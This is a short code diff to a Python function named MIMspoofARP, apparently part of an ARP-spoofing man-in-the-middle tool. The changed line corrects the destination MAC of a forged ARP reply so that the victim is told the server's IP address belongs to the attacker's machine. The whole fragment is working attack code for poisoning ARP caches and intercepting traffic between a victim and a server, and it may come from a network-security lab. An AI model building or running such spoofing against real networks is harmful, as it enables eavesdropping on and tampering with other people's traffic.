@@ -22,7 +22,7 @@ def MIMspoofARP(ipVictim, ipServer):
     arpTo[Ether].src = macAttacker
     arpTo[ARP].hwsrc = macAttacker
     arpTo[ARP].psrc = ipServer
-    arpTo[ARP].hwdst = macServer
+    arpTo[ARP].hwdst = macVictim
     arpTo[ARP].pdst = ipVictim
 
     arpFrom = Ether() / ARP()
